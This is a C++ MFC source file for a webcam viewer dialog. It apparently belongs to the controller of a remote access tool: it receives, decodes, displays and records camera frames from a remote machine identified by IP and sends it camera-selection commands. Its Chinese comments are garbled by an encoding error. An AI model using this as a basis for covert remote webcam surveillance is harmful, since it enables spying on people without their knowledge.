
#include "stdafx.h"
#include "Quick.h"
#include "WebCamDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// ��Ƶѹ��
	IDM_SAVEDIB,					// �������
	IDM_SAVEAVI,					// ����¼��
	IDM_SAVEAVI_MAKE,					// ����¼��
	IDM_SIZE_176_144,				// ��Ƶ�ֱ���, H263ֻ֧��������
	IDM_SIZE_320_240,
	IDM_SIZE_352_288,
};
enum
{
	IDM_WEBCAM_BEGIN = 0x0020
};

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CWebCamDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_XST));
	m_nCount = 0;
	m_lpbmi = NULL;
	m_lpScreenDIB = NULL;
	m_dec = NULL;
	m_bRecord = FALSE;
	m_nDeviceNums = 0;
	m_deviceList = NULL;
	m_nWebcamSelected = 0;
	m_width = 320;
	m_height = 240;
	m_iResNum = 0;
	m_bReset = FALSE;
	m_IPAddress = m_pContext->szAddress;
	m_avi = NULL;
	m_nOldWidth = 0;
	m_nCount = 0;
	m_bOnClose = false;

}


void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
	 #ifdef NDEBUG
	ON_WM_PAINT()
	 #endif
	ON_WM_SYSCOMMAND()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
ON_WM_DESTROY()
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers


void CWebCamDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ��Ƶ��С�����ɹ�
		ResetScreen();
		break;
	default:
		// ���䷢���쳣����
		SendException();
		break;
	}
}

void CWebCamDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	CString str;
	str.Format(_T("\\\\%s [%d * %d] -Զ����Ƶ  [�հ�:%d ��:%d KB] [����:%d ��:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}



bool CWebCamDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("Bitmap(*.bmp)|*.bmp|"), this);
	if (dlg.DoModal() != IDOK)
		return false;
	BITMAPFILEHEADER	hdr;
	CFile	file;
	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("Save File Failed"));
		return false;
	}
	// Fill in the fields of the file header
	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize = m_fmtFrame.biSizeImage + sizeof(hdr) + sizeof(BITMAPINFOHEADER);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(&m_fmtFrame, sizeof(BITMAPINFOHEADER));
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, m_fmtFrame.biSizeImage);
	file.Close();
	return true;
}


void CWebCamDlg::SaveAvi()
{
	m_bReset = FALSE;
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		m_bRecord = FALSE;
		return;
	}

	m_aviFile = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
	CFileDialog dlg(FALSE, _T("avi"), m_aviFile, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
	if (dlg.DoModal() != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = _T("");
		m_bRecord = FALSE;
		MessageBox(_T("Create Video(*.avi) Failed"));
	}
	else
	{
		SendResetScreen(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
		m_bRecord = TRUE;
	}
}

void CWebCamDlg::SaveAvi_make()
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI_MAKE, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI_MAKE, MF_UNCHECKED);
		m_aviFile_MovieMaker = "";
		m_avi->Close();
		delete m_avi;
		m_avi = NULL;
		KillTimer(132);
		return;
	}

	m_aviFile_MovieMaker = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
	CFileDialog dlg(FALSE, _T("avi"), m_aviFile_MovieMaker, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
	if (dlg.DoModal() != IDOK)
		return;
	m_aviFile_MovieMaker = dlg.GetPathName();
	vector<string> codecsk;
	codecsk.push_back("menu");
	m_avi = new MovieMaker;
	m_avi->Init(m_aviFile_MovieMaker.GetBuffer(0), m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 20, codecsk, 24);
	if (m_avi->Init(m_aviFile_MovieMaker.GetBuffer(0), m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 20, codecsk, 24))
	{
		AfxMessageBox(_T("¼��ʧ��"));
		return;
	}
	else
	{
		::SetTimer(m_hWnd, 132, 25, NULL);
		pSysMenu->CheckMenuItem(IDM_SAVEAVI_MAKE, MF_CHECKED);
	}
}
void CWebCamDlg::SendException()
{
	BYTE	bBuff = COMMAND_WEBCAM_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{
	// ���m_MMI�Ѿ�����ֵ
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void*)lparam, &m_MMI, sizeof(MINMAXINFO));
	return NULL;
}

void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// �߿�Ŀ��
	int	nBorderWidth = rectClient.left - rectWindow.left;

	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// �������ڵ�Զ�̴�С
	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // �������ĸ߶�
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// ��С��Track�ߴ�
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// ���ʱ���ڵ�λ��
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// �������ߴ�
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// ����Track�ߴ�ҲҪ�ı�
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;

}

void CWebCamDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	// ����ʱ�Ƴ��Լ�����ͼ�е�����
	// �������¼��ֹͣ
	if (!m_aviFile.IsEmpty())
		SaveAvi();

	if (!m_aviFile_MovieMaker.IsEmpty())
	{
		m_aviFile_MovieMaker = "";
		if (m_avi != NULL)
		{
			m_avi->Close();
			delete m_avi;
			m_avi = NULL;
		}
		KillTimer(132);
	}

	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

	if (m_deviceList)
	{
		delete[] m_deviceList;
		m_deviceList = NULL;
	}

	if (m_dec)
	{
		m_dec->Close();
		delete m_dec;
		m_dec = NULL;
	}
	if (m_lpbmi)
		delete[] m_lpbmi;
	if (m_lpScreenDIB)
		delete[] m_lpScreenDIB;

	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CWebCamDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}


BOOL CWebCamDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	ResetScreen();
	char* Device_head = NULL;
	char* Device_end = NULL;
	char* Res_head = NULL;
	char* Res_end = NULL;
	//	int	iResNum = 0;
		// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("�����ͼ(&P)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("������Ƶ�����밲װXvid¼����Ƶ������(&A)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_MAKE, _T("������Ƶ(&B)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);
		Device_head = m_deviceList;
		for (int i = 0; i < m_nDeviceNums; i++)
		{
			CMenu SubMenu;
			Res_end = NULL;
			Device_end = strchr(Device_head, '$');
			*Device_end = '\0';
			Res_head = strchr(Device_head, '#') + 1;
			*(Res_head - 1) = '\0';
			SubMenu.CreateMenu();
			do
			{
				ResolutionInfo tempInfo;
				char temp;
				tempInfo.m_DeviceIndex = i;
				Res_end = strchr(Res_head, ':');
				if (Res_end == NULL)
				{
					break;
				}
				*Res_end = '\0';
		
				sscanf_s(Res_head, "%d %c %d", &tempInfo.m_iWidth, &temp, sizeof(char), &tempInfo.m_iHeight);
				CString str;
				bool state = 1;

				for (int i = 0; i <= m_iResNum; i++)
				{
					SubMenu.GetMenuString(IDM_WEBCAM_BEGIN + i - 1, str, MF_BYCOMMAND);
					if (lstrcmp(str, CString(Res_head)) == 0)
					{
						state = 0;
						break;
					}

				}
				if (state)
				{
					SubMenu.AppendMenu(MF_STRING, IDM_WEBCAM_BEGIN + m_iResNum, CString(Res_head));
					m_iResNum++;
				}

				m_resInfo.push_back(tempInfo);

				if (Res_end)
				{
					Res_head = Res_end + 1;
				}

			} while (Res_end != NULL);
			pSysMenu->InsertMenu(-1, MF_STRING | MF_POPUP | MF_BYPOSITION, (UINT)SubMenu.m_hMenu, CString(Device_head));
			Device_head = Device_end + 1;
		}
		// ��֧�̶ֹ��Ĵ�С��˵��Զ����Ƶ�й̶��Ĵ�С����������ʧЧ 
// 		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biHeight != 288)
// 			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biHeight != 144)
// 			&& (m_lpbmi->bmiHeader.biWidth != 320 && m_lpbmi->bmiHeader.biHeight != 240))
// 		{
// 			pSysMenu->EnableMenuItem(IDM_SIZE_176_144, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 			pSysMenu->EnableMenuItem(IDM_SIZE_320_240, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 			pSysMenu->EnableMenuItem(IDM_SIZE_352_288, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 		}
// 		else
// 			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_320_240, MF_BYCOMMAND);

	}

	// ��ʼ�����ڴ�С�ṹ
	InitMMI();

	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);
	if (m_dec == NULL)
	{
		m_dec = new CXvidDec();
		m_dec->AttachCaller(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, this);
		CXvidDec::XVID_GLOBAL_INIT();
		m_dec->Open();
	}


	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT_CWebCamDlg;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	//case IDM_ENABLECOMPRESS:
	//{
	//	bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
	//	pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
	//	bIsChecked = !bIsChecked;
	//	BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
	//	if (!bIsChecked)
	//		bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
	//	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	//}
	break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	case IDM_SAVEAVI_MAKE:
		SaveAvi_make();
		break;
	default:
	{
		if ((int)nID >= IDM_WEBCAM_BEGIN && (int) nID < (IDM_WEBCAM_BEGIN + m_iResNum))
		{
			m_nWebcamSelected = m_resInfo[nID - IDM_WEBCAM_BEGIN].m_DeviceIndex;
			if (SendResetScreen(m_resInfo[nID - IDM_WEBCAM_BEGIN].m_iWidth, m_resInfo[nID - IDM_WEBCAM_BEGIN].m_iHeight))
			{
				//						CMenu* pSubMenu = NULL;
				//						pSubMenu = pSysMenu->GetSubMenu(0 + m_nWebcamSelected);
				//						pSubMenu->CheckMenuRadioItem(IDM_WEBCAM_BEGIN, IDM_WEBCAM_BEGIN + m_iResNum-1, nID, MF_BYCOMMAND);
			}
		}
		else
		{
			CDialog::OnSysCommand(nID, lParam);
		}
	}
	}
}

void CWebCamDlg::SendNext()
{
	BYTE	bToken = COMMAND_NEXT_CWebCamDlg;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CWebCamDlg::DrawDIB()
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // û�о���H263ѹ����ԭʼ���ݣ�����Ҫ����
	{
		// ��һ�Σ�û��ѹ����˵������˲�֧��ָ���Ľ�����
// 		if (m_nCount == 1)
// 		{
// 			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 		}
// 		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);


		// д��¼���ļ�
		if (m_bReset && m_bRecord)
		{
			m_aviStream.Write(lpBuffer + nHeadLen, nBufferLen - nHeadLen);
		}
		if (m_dec)
		{
			m_dec->Decode(lpBuffer + nHeadLen, nBufferLen - nHeadLen);
		}
	}
	else // ����
	{
		// 		InitCodec(*(LPDWORD)(lpBuffer + 2));
		// 		if (m_pVideoCodec != NULL)
		// 		{
		// 			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
		// 			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
		// 			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
		// 				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
		//		}
	}
#if _DEBUG
	DoPaint();
#else
	PostMessage(WM_PAINT);
#endif

}



bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
{
	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		MessageBox(_T("��ֹͣ¼�� .."), _T("ע��"));
		return false;
	}
	m_width = nWidth;
	m_height = nHeight;
	BYTE	bPacket[13];
	bPacket[0] = COMMAND_WEBCAM_RESIZE;
	*((LPDWORD)&bPacket[1]) = nWidth;
	*((LPDWORD)&bPacket[5]) = nHeight;
	*((LPDWORD)&bPacket[9]) = m_nWebcamSelected;
	m_iocpServer->Send(m_pContext, bPacket, sizeof(bPacket));

	return true;
}

void CWebCamDlg::ResetScreen()
{
	if (m_dec)
	{
		m_dec->Close();
		delete m_dec;
		m_dec = NULL;
	}
	if (m_lpbmi)
	{
		delete[] m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete[] m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}

	int	nBmiSize = sizeof(BITMAPINFO);
	int nStrLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - nBmiSize - sizeof(int);
	//	m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);
	memcpy(&m_nDeviceNums, m_pContext->m_DeCompressionBuffer.GetBuffer(1 + nBmiSize), sizeof(int));
	if (m_deviceList)
	{
		delete[] m_deviceList;
		m_deviceList = NULL;
	}
	LPBYTE szBuffe = new BYTE[nStrLen + 1];
	m_deviceList = (char*)szBuffe;
	//	memset(m_deviceList,0,nStrLen+1);
	memcpy(m_deviceList, m_pContext->m_DeCompressionBuffer.GetBuffer(1 + nBmiSize + sizeof(int)), nStrLen);
	//#ifdef MY_TEST
	memset(&m_fmtFrame, 0, sizeof(BITMAPINFOHEADER));
	m_fmtFrame.biSize = sizeof(BITMAPINFOHEADER);
	m_fmtFrame.biWidth = m_lpbmi->bmiHeader.biWidth;
	m_fmtFrame.biHeight = m_lpbmi->bmiHeader.biHeight;
	m_fmtFrame.biBitCount = 24;
	m_fmtFrame.biPlanes = 1;
	m_fmtFrame.biSizeImage = m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biHeight * 3;
	// 	#if 0
	// 		void* PBits;
	// 		m_hBmp = CreateDIBSection(m_hDC, (BITMAPINFO*)&m_fmtFrame, DIB_RGB_COLORS, (void**)&PBits, NULL, 0);
	// 		CDC dc;
	// 		m_cDc.CreateCompatibleDC(GetDC());
	// 		CBitmap * pSaveBmp = m_cDc.SelectObject(CBitmap::FromHandle(m_hBmp));
	// 	#endif	
	// #else
	// 	m_bitmap.CreateCompatibleBitmap(this->GetDC(), m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	// 	m_cDc.CreateCompatibleDC(GetDC());
	// 	m_cDc.SelectObject(&m_bitmap);
	// #endif
	m_dec = new CXvidDec;
	m_dec->AttachCaller(m_fmtFrame.biWidth, m_fmtFrame.biHeight, this);

	CXvidDec::XVID_GLOBAL_INIT();
	m_dec->Open();
	m_lpScreenDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	//	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	if (IsWindowVisible())
		InitMMI();
	CString str;
	str.Format(_T("\\\\%s ��%d * %d�� -Զ����Ƶ"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	m_bReset = TRUE;
}

void CWebCamDlg::PostDecHandler(unsigned char* image, int used_bytes)
{
	memcpy(m_lpScreenDIB, image, m_fmtFrame.biSizeImage);
#if _DEBUG
	DoPaint();
#else
	PostMessage(WM_PAINT);
#endif

}

void CWebCamDlg::DoPaint()
{
	// TODO: Add your message handler code here
	RECT rect;
	GetClientRect(&rect);
	if (m_lpbmi == NULL)
	{
		return;
	}
	DrawDibDraw
	(
		m_hDD,
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)&m_fmtFrame,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
		DDF_SAME_HDC
	);

	// д��¼���ļ�
	if (!m_aviFile.IsEmpty())
	{
		LPCTSTR	lpTipsString = _T("��");
		//		m_aviStream.Write(m_lpScreenDIB);
				// ��ʾ����¼��
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	// Do not call CDialog::OnPaint() for painting messages
}

void CWebCamDlg::OnPaint()
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting
	RECT rect;
	GetClientRect(&rect);

	DrawDibDraw
	(
		m_hDD,
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)&m_fmtFrame,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
		DDF_SAME_HDC
	);


	// д��¼���ļ�
	if (!m_aviFile.IsEmpty())
	{
		LPCTSTR	lpTipsString = _T("��");
		// ��ʾ����¼��
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	CDialog::OnPaint();
}

void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus)
{
	CDialog::OnShowWindow(bShow, nStatus);

	// TODO: Add your message handler code here

}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	if (!IsWindowVisible())
		return;

	// �������������ڴ�С
	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y

	RECT	rectClientToScreen, rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	GetClientRect(&rectClientToScreen);
	ClientToScreen(&rectClientToScreen);
	// �߿�Ŀ��
	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;

	int	nWindowWidth = rectWindow.right - rectWindow.left;
	int	nWindowHeight = rectWindow.bottom - rectWindow.top;

	// �����仯
	if (m_nOldWidth != nWindowWidth)
		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
	else
		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;

	m_nOldWidth = nWindowWidth;

	MoveWindow(&rectWindow);

#if _DEBUG
	DoPaint();
#else
	PostMessage(WM_PAINT);
#endif




}


//void CWebCamDlg::OnDestroy()
//{
//	/*__super::*/CDialog::OnDestroy();
//	if (m_dec)
//	{
//		m_dec->Close();
//		delete m_dec;
//		m_dec = NULL;
//	}
//	if (m_lpbmi)
//		delete[] m_lpbmi;
//	if (m_lpScreenDIB)
//		delete[] m_lpScreenDIB;
//	// TODO: �ڴ˴������Ϣ����������
//}


void CWebCamDlg::OnTimer(UINT nIDEvent)
{
	//	 TODO: Add your message handler code here and/or call default
	if (!m_aviFile_MovieMaker.IsEmpty())
	{
		LPCTSTR	lpTipsString = _T("��");
		m_avi->AddFrame((void*)m_lpScreenDIB);
		// ��ʾ����¼��
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	CDialog::OnTimer(nIDEvent);
}

